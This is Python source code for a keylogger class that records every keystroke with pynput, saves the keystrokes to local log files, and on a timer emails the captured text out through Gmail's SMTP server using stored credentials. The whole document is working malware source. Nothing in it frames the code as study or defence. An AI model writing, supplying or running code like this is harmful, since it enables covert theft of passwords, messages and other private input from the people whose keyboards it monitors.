import pynput.keyboard
import threading
import smtplib
import datetime
import os
import logging

SMTP_HOST="smtp.gmail.com"
SMTP_PORT=587
from pynput.keyboard import Key

# Dictionary for cleaner display of special keys
SPECIAL_KEYS = {
    Key.space: " ",
    Key.enter: "[ENTER]",
    Key.backspace: "[BACKSPACE]",
    Key.tab: "[TAB]",
    Key.shift: "[SHIFT]",
    Key.shift_r: "[SHIFT-R]",
    Key.ctrl_l: "[CTRL-L]",
    Key.ctrl_r: "[CTRL-R]",
    Key.alt_l: "[ALT-L]",
    Key.alt_r: "[ALT-R]",
    Key.esc: "[ESC]",
    Key.caps_lock: "[CAPSLOCK]",
    Key.cmd: "[CMD]",
    Key.delete: "[DEL]",
    Key.up: "[UP]",
    Key.down: "[DOWN]",
    Key.left: "[LEFT]",
    Key.right: "[RIGHT]"
}

class EnhancedKeyLogger:
    def __init__(self, email, password, interval=120):
        # Initialize configuration
        self.timer=None
        self.email = email
        self.password = password
        self.interval = interval
        self.log_data = "Key Logger Started!!\n"
        self.start_time = datetime.datetime.now()
        # Create "Log" folder if it doesn't exist
        log_dir = os.path.join(os.getcwd(), "Captured_Logs")
        os.makedirs(log_dir, exist_ok=True)
        # Setup basic file logging
        log_filename = f"keylog_{self.start_time.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        self.log_file_path = os.path.join(log_dir, log_filename)
        logging.basicConfig(filename=self.log_file_path, level=logging.DEBUG)

    def append_to_log(self, text):
        self.log_data += text
        logging.debug(text)

    def process_key_press(self, key):
        try:
            # If alphanumeric key, get character representation
            current_key = str(key.char)
        except AttributeError:
            # Handle special keys from the SPECIAL_KEYS dictionary
            current_key = SPECIAL_KEYS.get(key, f"[{key.name.upper()}]")
        self.append_to_log(current_key)

    def report(self):
        # Adds timestamp and tries to send email
        if self.log_data.strip():
            try:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                message = f"\n[Log Time: {timestamp}]\n{self.log_data}"
                self.send_email(self.email, self.password, message)
                self.log_data = ""  # Reset log
            except Exception as e:
                self.append_to_log(f"\n[!] Failed to send email: {str(e)}\n")

        # Schedule next report
        self.timer = threading.Timer(self.interval, self.report)
        #timer.daemon = True
        self.timer.start()

    def send_email(self, email, password, message):
        # Send logs via Gmail SMTP
        server = smtplib.SMTP(SMTP_HOST,SMTP_PORT)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        print(f"[+] Mail Sent successfully!!\n")
        server.quit()

    def start(self):
        # Start the keylogger
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
